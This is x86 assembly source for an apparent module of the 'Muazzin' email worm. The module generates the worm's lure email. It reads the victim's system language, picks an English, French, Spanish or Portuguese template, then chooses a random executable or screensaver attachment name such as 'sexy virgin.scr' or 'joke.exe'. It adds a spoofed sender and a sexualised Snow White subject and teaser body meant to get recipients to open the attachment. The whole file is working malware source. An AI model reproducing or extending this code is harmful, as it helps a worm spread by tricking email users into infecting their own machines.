;Muazzin para gerar texto de email
;thankz2urgo

BITS 32

%include "\muazzin\muazzin.asi"

TYPE    EQU "text"
VERSION EQU 0002h

start:
       jmp entry

gen_da_text:
       pushad

       call .kernel
       db "KERNEL32.DLL", 0
  .kernel:
       call dword [ebp+GMH]
       call .api
       dd "GetTickCount", 0
  .api:
       push eax
       call .api2
       dd "GetSystemDefaultLangID", 0
  .api2:
       push eax
       call dword [ebp+GPA]
       call eax
       mov ebx, eax                     ;edx==languageID
       call dword [ebp+GPA]

       movzx edx, bl
       mov ebx, eax

       cmp dl, 0ch
       je .franca
       cmp dl, 16h
       je .brasil
       cmp dl, 0ah
       je .spaniol
       cmp dl, 09h
       jne near .dunno
       mov dl, 0
       jmp .show
  .franca:
       mov dl, 1
       jmp .show
  .spaniol:
       mov dl, 2
       jmp .show
  .brasil:
       mov dl, 3
  .show:
       mov edi, [ebp+m_buffer]                  ;make name.exe

       call .delta
  .delta:
       pop ebp
       sub ebp, .delta

       mov [ebp+_buffer], edi

       add edi, mtext_exename

       mov edx, [ebp+edx*4+lang_table]
       mov esi, [ebp+edx+4]
       add esi, ebp
       call rnd
       and ecx, 11b                     ;4 possible names
  .next:
       lodsd
       dec cl
       jns .next
  .zkip1:
       lea esi, [eax+ebp]
  .nextb:
       lodsb
       stosb
       test al, al
       jnz .nextb

       mov edi, [ebp+_buffer]                  ;make sender/subject
       add edi, mtext_headers
       lea esi, [ebp+sender_subj]
  .nextb1:
       lodsb
       test al, al
       jz .nextb11                             ;sender
       stosb
       jmp .nextb1
  .nextb11:

       mov esi, [ebp+edx+8]
       add esi, ebp
  .nextb2:
       lodsb
       stosb
       test al, al
       jnz .nextb2                              ;subject

       mov edi, [ebp+_buffer]
;       add edi, mtext_bodymsg
       mov esi, [ebp+edx]
       add esi, ebp
  .nextb3:
       lodsb
       stosb
       test al, al
       jnz .nextb3                              ;joke text

  .dunno:
       popad
  exit:
       mov dword [ebp+m_result], MR_OK
       ret 4

entry:
       mov ebp, [esp+4]
       mov eax, [ebp+m_why]
       test eax, MT_GENTEXT
       jnz near gen_da_text
       test eax, MT_QUERY
       jz near exit
       mov esi, MT_QUERY+MT_GENTEXT
       mov ebx, TYPE
       mov ecx, VERSION
       mov eax, MR_DONE
       ret 4

rnd:
       pushad
       call .delta
  .delta:
       pop esi
       add esi, value-.delta
       call ebx
       add dword [esi], eax
       ror dword [esi], 11
       xor dword [esi], ebx
       popad
       db 0b9h                          ;mov ecx, ?
  value dd 0
       ret

lang_table:
       dd english
       dd french
       dd spanish
       dd portuguese
english:
       dd english_text
       dd english_names
       dd english_subject
french:
       dd french_text
       dd french_names
       dd french_subject
spanish:
       dd spanish_text
       dd spanish_names
       dd spanish_subject
portuguese:
       dd portuguese_text
       dd portuguese_names
       dd portuguese_subject
spanish_names:
       dd es_name0
       dd es_name1
       dd es_name2
       dd es_name3
english_names:
       dd en_name0
       dd en_name1
       dd en_name2
       dd en_name3
french_names:
       dd fr_name0
       dd fr_name1
       dd fr_name2
       dd fr_name3
portuguese_names:
       dd pt_name0
       dd pt_name1
       dd pt_name2
       dd pt_name3

es_name0 db "enano.exe", 0
es_name1 db "enano porno.exe", 0
es_name2 db "blanca de nieve.scr", 0
es_name3 db "enanito fisgon.exe", 0
en_name0 db "sexy virgin.scr", 0
en_name1 db "joke.exe", 0
en_name2 db "midgets.scr", 0
en_name3 db "dwarf4you.exe", 0
fr_name0 db "blancheneige.exe", 0
fr_name1 db "sexynain.scr", 0
fr_name2 db "blanche.scr", 0
fr_name3 db "nains.exe", 0
pt_name0 db "branca de neve.scr", 0
pt_name1 db "atchim.exe", 0
pt_name2 db "dunga.scr", 0
pt_name3 db "anão pornô.scr", 0

sender_subj db "From: Hahaha <hahaha@sexyfun.net>", 13, 10
        db "Subject: ", 0

english_subject db "Snowhite and the Seven Dwarfs - The REAL story!", 13,10, 0
portuguese_subject db "Branca de Neve pornô!", 13,10, 0
spanish_subject db "Enanito si, pero con que pedazo!", 13,10, 0
french_subject db "Blanche neige et ...les sexe nains", 13,10, 0

french_text:
        db "C'etait un jour avant son dix huitieme anniversaire. Les 7 nains, qui avaient", 13, 10
        db "aidé 'blanche neige' toutes ces années après qu'elle se soit enfuit de chez", 13, 10
        db "sa belle mère, lui avaient promis une *grosse* surprise. A 5 heures comme", 13, 10
        db "toujours, ils sont rentrés du travail. Mais cette fois ils avaient un air", 13, 10
        db "coquin..."
        db 13, 10, 0

english_text:
        db "Today, Snowhite was turning 18. The 7 Dwarfs always where very educated and", 13, 10
        db "polite with Snowhite. When they go out work at mornign, they promissed a ", 13, 10
        db "*huge* surprise. Snowhite was anxious. Suddlently, the door open, and the Seven", 13, 10
        db "Dwarfs enter..."
        db 13, 10, 0

spanish_text:
        db "Faltaba apenas un dia para su aniversario de de 18 años. Blanca de Nieve fuera", 13, 10
        db "siempre muy bien cuidada por los enanitos. Ellos le prometieron una *grande*", 13, 10
        db "sorpresa para su fiesta de compleaños. Al entardecer, llegaron. Tenian un brillo", 13, 10
        db "incomun en los ojos..."
        db 13, 10, 0

portuguese_text:
        db "Faltava apenas um dia para o seu aniversario de 18 anos. Branca de Neve estava", 13, 10
        db "muito feliz e ansiosa, porque os 7 anões prometeram uma *grande* surpresa.", 13, 10
        db "As cinco horas, os anõezinhos voltaram do trabalho. Mas algo nao estava", 13, 10
        db "bem... Os sete anõezinhos tinham um estranho brilho no olhar..."
        db 13, 10, 0

_buffer dd 0
